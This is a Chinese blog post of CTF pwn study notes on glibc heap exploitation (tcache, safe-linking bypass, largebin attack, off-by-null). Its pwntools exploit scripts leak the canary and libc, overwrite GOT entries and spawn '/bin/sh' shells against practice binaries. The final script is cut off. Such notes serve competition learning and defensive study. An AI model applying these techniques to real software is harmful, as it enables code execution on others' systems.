<!DOCTYPE html><html lang="cn"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><meta name="author" content="WendyJellyBeans"><link rel="icon" href="/hexo.png"><title>(*╹▽╹*)</title><meta name="description" content=""><link rel="alternate" type="application/rss+xml" title="(*╹▽╹*)" href="/atom.xml"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.5.0/css/font-awesome.min.css"><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css"><link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/css/highlight.css"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800"><meta name="generator" content="Hexo 5.4.0"></head><body><nav class="navbar navbar-default navbar-fixed-top navbar-custom"><div class="container-fluid"><div class="navbar-header"><button type="button" data-toggle="collapse" data-target="#main-navbar" class="navbar-toggle"><span class="sr-only">Toggle navigation</span><span class="icon-bar"></span><span class="icon-bar"></span><span class="icon-bar"></span></button><a href="/" class="navbar-brand">(*╹▽╹*)</a></div><div id="main-navbar" class="collapse navbar-collapse"><ul class="nav navbar-nav navbar-right"><li><a href="/archives">Archive</a></li><li><a href="https://brooke-hub.github.io">Github</a></li><li><a href="/about/">About</a></li></ul></div><div class="avatar-container"><div class="avatar-img-border"><a href="/"><img src="/hexo.png" class="avatar-img"></a></div></div></div></nav><header class="header-section"><div class="intro-header no-img"><div class="container"><div class="row"><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><div class="post-heading"><h1>tonight</h1><p class="post-meta">Posted on Apr 21 2021 · <a href="/tags/others/" class="tag post-meta">others</a></p></div></div></div></div></div></header><div class="container"><div class="row"><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><article role="main" class="blog-post"><h3 id="4-8"><a href="#4-8" class="headerlink" title="4.8"></a>4.8</h3><ul>
<li>通过一字节修改mp_.tcache_bins，改大，并且把存放在堆空间上的tcache struct内容(一般在top chunk)修改为目标地址，那在调用tcache_get<strong>根据tc_idx索引</strong>取堆块时就会超过原来的范围向下取堆块，假设entries[tc_idx]恰好又不为0此似乎便会将起返回，从而申请到目标地址</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/xoc9LeME2fmIoWLM7IzTrw">VNCTF2021 LittleRedFlower</a></p>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/1144313/1617852067326-b466d25c-efb4-4d9e-95da-a11680d56e18.png" alt="img"></p>
<ul>
<li><p>2.32对tcache新增的保护</p>
</li>
<li><p>fd是(chunk_addr &gt;&gt; 12)^(tcache-&gt;entries)  </p>
</li>
<li><p>那么第一个tcache chunk的fd 就是(chunk_addr &gt;&gt; 12)^0 (泄露出来再&lt;&lt;12就是heap_base啦)</p>
</li>
<li><p>之前tcache attack是直接把fd改为<code>目标地址</code>即可，现在把fd改为<code>(chunk_addr &gt;&gt; 12)^目标地址</code>就可以啦</p>
</li>
<li><p>直接打到tcache_perthread_struct，填0x290的count为7，free 该chunk就进入了unosrtedbin！</p>
</li>
<li><p>之后把unosrtedbin addr踩到tcache的指针处，爆破一位，申请到_IO_2_1_stdout_</p>
</li>
<li><p>得到libc之后接着改tcache指针</p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/1OzuKnQK2wNxhHYObN3UYA">VNCTF2021 ff</a></p>
</li>
</ul>
<ul>
<li><p>pwntools 可以使用 <code>shutdown_raw(direction=&#39;send&#39;)</code> 关闭管道的 send 方向，使远程 <code>read()</code> 读到 EOF，返回 0</p>
</li>
<li><p>数组-1越界，爆破，如果程序任意申请到了flag附近的chunk，可直接泄露flag</p>
</li>
</ul>
<h3 id="4-10"><a href="#4-10" class="headerlink" title="4.10"></a>4.10</h3><ul>
<li><p>huxiangbei_2019_namesystem </p>
</li>
<li><p>删除chunk时全局数组index漏了处理最后一位，指针悬空</p>
</li>
<li><p>没有show功能但是可以改free@got为printf@plt，在一个chunk中写入fmt，对栈进行泄漏，得到libc</p>
</li>
<li><p>要提前布置好两个double free，因为改完free@got就不能正常用free了</p>
</li>
</ul>
<h3 id="4-11"><a href="#4-11" class="headerlink" title="4.11"></a>4.11</h3><h3 id="4-12"><a href="#4-12" class="headerlink" title="4.12"></a>4.12</h3><h3 id="4-13"><a href="#4-13" class="headerlink" title="4.13"></a>4.13</h3><p>2019西湖论剑预选</p>
<p><strong>story</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">binary=<span class="string">&#x27;./story&#x27;</span></span><br><span class="line">sh=process(binary)</span><br><span class="line"><span class="comment"># sh=remote(&#x27;node3.buuoj.cn&#x27;,29146)</span></span><br><span class="line">elf=ELF(binary)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># libc=ELF(&#x27;libc-2.23.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">sa = <span class="keyword">lambda</span> s,n : sh.sendafter(s,n)</span><br><span class="line">sla = <span class="keyword">lambda</span> s,n : sh.sendlineafter(s,n)</span><br><span class="line">sl = <span class="keyword">lambda</span> s : sh.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : sh.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : sh.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : sh.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : sh.interactive()</span><br><span class="line">leak = <span class="keyword">lambda</span> name,addr :log.success(name+<span class="string">&quot;:&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;Your ID:&#x27;</span>,<span class="string">&#x27;%15$p.%25$p&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">canary=<span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;.&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line">leak(<span class="string">&#x27;canary&#x27;</span>,canary)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">libc_base =<span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>) - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>] - <span class="number">240</span></span><br><span class="line">leak(<span class="string">&#x27;libc_base&#x27;</span>,libc_base) </span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;the size of your story:&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x400</span>))</span><br><span class="line">pop_rdi=<span class="number">0x0000000000400bd3</span></span><br><span class="line">binsh_addr=libc_base+libc.search(<span class="string">&#x27;/bin/sh\x00&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">sla(<span class="string">&#x27;story:&#x27;</span>,<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x90</span>-<span class="number">0x8</span>)+p64(canary)+<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+p64(pop_rdi)+p64(binsh_addr)+p64(system))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line">ti()</span><br></pre></td></tr></table></figure>

<h3 id="4-14"><a href="#4-14" class="headerlink" title="4.14"></a>4.14</h3><p><strong>noinfoleak</strong></p>
<p>全局指针上面的stdin内容可以伪造chunk size</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">binary=<span class="string">&#x27;./noinfoleak&#x27;</span></span><br><span class="line">sh=process(binary)</span><br><span class="line"><span class="comment"># sh=remote(&#x27;node3.buuoj.cn&#x27;,29146)</span></span><br><span class="line">elf=ELF(binary)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># libc=ELF(&#x27;libc-2.23.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">sa = <span class="keyword">lambda</span> s,n : sh.sendafter(s,n)</span><br><span class="line">sla = <span class="keyword">lambda</span> s,n : sh.sendlineafter(s,n)</span><br><span class="line">sl = <span class="keyword">lambda</span> s : sh.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : sh.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : sh.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : sh.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : sh.interactive()</span><br><span class="line">leak = <span class="keyword">lambda</span> name,addr :log.success(name+<span class="string">&quot;:&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leaklibc</span>():</span></span><br><span class="line">    <span class="keyword">global</span> libc_base,__malloc_hook,__free_hook,system,binsh_addr,_IO_2_1_stdout_,_IO_list_all</span><br><span class="line">    libc_base = u64(sh.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">    success(<span class="string">&#x27;libc_base = &#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">    __malloc_hook=libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    __free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;&gt;&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	sa(<span class="string">&#x27;&gt;&#x27;</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">index</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;&gt;&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;&gt;&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	sa(<span class="string">&#x27;&gt;&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line">chunk_list=<span class="number">0x0000000006010A0</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;a\n&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;a\n&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(chunk_list-<span class="number">0x13</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;a\n&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x3</span>+p64(elf.got[<span class="string">&#x27;free&#x27;</span>])+p64(<span class="number">0x60</span>)+p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>])+p64(<span class="number">0x60</span>)+<span class="string">&#x27;\n&#x27;</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># add(0x50,&#x27;a\n&#x27;)#4</span></span><br><span class="line">edit(<span class="number">0</span>,p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">leaklibc()</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,p64(system))</span><br><span class="line">sla(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line">ti()</span><br></pre></td></tr></table></figure>

<p><strong>Note_Storm</strong></p>
<p>libc2.23</p>
<p>largebin attack</p>
<p>禁用了fastbin，size可以很大，申请到0xABCD0100任意写就可以绕过检查</p>
<p>有off by null构造chunk overlap</p>
<p>设置fake pre size</p>
<p>dele 一个大chunk0，变成unsortedchunk</p>
<p>off by null修改unsortedchunk 的 pre inuse，并改小size</p>
<p>切割分配unsortedchunk为一个小chunk和一个大chunk1（要绕过size和对应pre size的检查，这是前面设置的fake pre size的作用）</p>
<p>dele 小chunk</p>
<p>再dele最开始那个大chunk0后面的chunk，由于它的pre size还保存着最开始那个大chunk0的size，它会直接全部合并，这里面就包括了还未被free的大chunk1</p>
<p>切割分配unsortedchunk为一个小chunk和一个大chunk2，就实现两个指针指向同一块内容</p>
<p>修改unsortedbin</p>
<p> <code>bk</code>为 <code>fake chunk（``0xABCD0100 -0x20``）</code></p>
<p>修改largebin（从unsortedbin申请一个chunk，会把剩余chunk放入largebin）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bk&#96;为 &#96;fake_chunk+8</span><br><span class="line">bk-&gt;nextsize&#96;为 &#96;fake_chunk-0x18-5</span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">binary=<span class="string">&#x27;./Storm_note&#x27;</span></span><br><span class="line">sh=process(binary)</span><br><span class="line"><span class="comment"># sh=remote(&#x27;node3.buuoj.cn&#x27;,29146)</span></span><br><span class="line">elf=ELF(binary)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># libc=ELF(&#x27;libc-2.23.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">sa = <span class="keyword">lambda</span> s,n : sh.sendafter(s,n)</span><br><span class="line">sla = <span class="keyword">lambda</span> s,n : sh.sendlineafter(s,n)</span><br><span class="line">sl = <span class="keyword">lambda</span> s : sh.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : sh.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : sh.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : sh.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : sh.interactive()</span><br><span class="line">leak = <span class="keyword">lambda</span> name,addr :log.success(name+<span class="string">&quot;:&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leaklibc</span>():</span></span><br><span class="line">    <span class="keyword">global</span> libc_base,__malloc_hook,__free_hook,system,binsh_addr,_IO_2_1_stdout_,_IO_list_all</span><br><span class="line">    libc_base = u64(sh.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">    success(<span class="string">&#x27;libc_base = &#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">    __malloc_hook=libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    __free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">index</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;Choice: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">	cmd(<span class="number">1</span>)</span><br><span class="line">	sla(<span class="string">&#x27;size ?&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	<span class="comment"># sa(&#x27;&gt;&#x27;,content)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">index</span>):</span></span><br><span class="line">	cmd(<span class="number">3</span>)</span><br><span class="line">	sla(<span class="string">&#x27;Index ?&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">	cmd(<span class="number">2</span>)</span><br><span class="line">	sla(<span class="string">&#x27;Index ?&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	sa(<span class="string">&#x27;Content:&#x27;</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backdoor</span>(<span class="params">buff</span>):</span></span><br><span class="line">	cmd(<span class="number">666</span>)</span><br><span class="line">	sa(<span class="string">&#x27;let you in&#x27;</span>,buff)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>)     <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x508</span>)    <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x18</span>)     <span class="comment">#2</span></span><br><span class="line">edit(<span class="number">1</span>, <span class="string">&#x27;h&#x27;</span>*<span class="number">0x4f0</span> + p64(<span class="number">0x500</span>))   <span class="comment">#set fake prev_size</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>)     <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x508</span>)    <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x18</span>)     <span class="comment">#5</span></span><br><span class="line">edit(<span class="number">4</span>, <span class="string">&#x27;h&#x27;</span>*<span class="number">0x4f0</span> + p64(<span class="number">0x500</span>))   <span class="comment">#set fake prev_size</span></span><br><span class="line">add(<span class="number">0x18</span>)     <span class="comment">#6</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ================================================================</span></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">&#x27;h&#x27;</span>*(<span class="number">0x18</span>))    <span class="comment">#off-by-one chunk1 0x510-&gt;0x500</span></span><br><span class="line">add(<span class="number">0x18</span>)     <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x4d8</span>)    <span class="comment">#7</span></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">2</span>)         <span class="comment">#backward consolidate</span></span><br><span class="line">add(<span class="number">0x38</span>)     <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x4e8</span>)    <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">3</span>, <span class="string">&#x27;h&#x27;</span>*(<span class="number">0x18</span>))    <span class="comment">#off-by-one</span></span><br><span class="line">add(<span class="number">0x18</span>)     <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x4d8</span>)    <span class="comment">#8</span></span><br><span class="line">dele(<span class="number">4</span>)</span><br><span class="line">dele(<span class="number">5</span>)         <span class="comment">#backward consolidate</span></span><br><span class="line">add(<span class="number">0x48</span>)     <span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">2</span>) <span class="comment"># two chunks in unsortedbin</span></span><br><span class="line">add(<span class="number">0x4e8</span>)    <span class="comment">#2 now malloc unsortedchunk2 and put unsortedchcunk5 to largebin</span></span><br><span class="line">dele(<span class="number">2</span>) <span class="comment"># in unsortedbin</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># modify unsortedbin</span></span><br><span class="line">storage = <span class="number">0xabcd0100</span></span><br><span class="line">fake_chunk = storage - <span class="number">0x20</span></span><br><span class="line">p1 = p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x4f1</span>) <span class="comment">#size</span></span><br><span class="line">p1 += p64(<span class="number">0</span>) + p64(fake_chunk)      <span class="comment">#bk</span></span><br><span class="line">edit(<span class="number">7</span>, p1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># modify largebin</span></span><br><span class="line">p2 = p64(<span class="number">0</span>)*<span class="number">4</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x4e1</span>) <span class="comment">#size</span></span><br><span class="line">p2 += p64(<span class="number">0</span>) + p64(fake_chunk+<span class="number">8</span>)    <span class="comment">#bk, for creating the &quot;bk&quot; of the faked chunk to avoid crashing when unlinking from unsorted bin</span></span><br><span class="line">p2 += p64(<span class="number">0</span>) + p64(fake_chunk-<span class="number">0x18</span>-<span class="number">5</span>)   <span class="comment">#bk_nextsize, for creating the &quot;size&quot; of the faked chunk, using misalignment tricks</span></span><br><span class="line">edit(<span class="number">8</span>, p2)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x48</span>)<span class="comment">#2 malloc to 0xabcd0100</span></span><br><span class="line">edit(<span class="number">2</span>,p64(<span class="number">0</span>)*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">backdoor(<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line">ti()</span><br></pre></td></tr></table></figure>



<h3 id="4-15"><a href="#4-15" class="headerlink" title="4.15"></a>4.15</h3><p>模板</p>
<p>starCTF2019 quicksort</p>
<p>实际上重点不是快排，有一个栈溢出可以覆盖到ptr指针，</p>
<p>控制栈对指针指向内容读写</p>
<p>输出地址为十进制，是负数，加上0x100000000就可以还原成十六进制地址了</p>
<p>同样写入atoi@plt的时候，也将system地址减去0x100000000，变成十进制负数</p>
<p>index也存放在栈上，覆盖时需要注意</p>
<p>atoi(s) // s= str(addr)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># context.arch=&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&#x27;./starctf_2019_quicksort&#x27;</span></span><br><span class="line">elf=ELF(binary)</span><br><span class="line"><span class="comment"># libc = ELF(&quot;/lib/i386-linux-gnu/libc-2.23.so&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">flag=<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> flag:</span><br><span class="line">    sh = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25177</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = process(binary)</span><br><span class="line"></span><br><span class="line">sa = <span class="keyword">lambda</span> s,n : sh.sendafter(s,n)</span><br><span class="line">sla = <span class="keyword">lambda</span> s,n : sh.sendlineafter(s,n)</span><br><span class="line">sl = <span class="keyword">lambda</span> s : sh.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : sh.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : sh.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : sh.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : sh.interactive()</span><br><span class="line">leak = <span 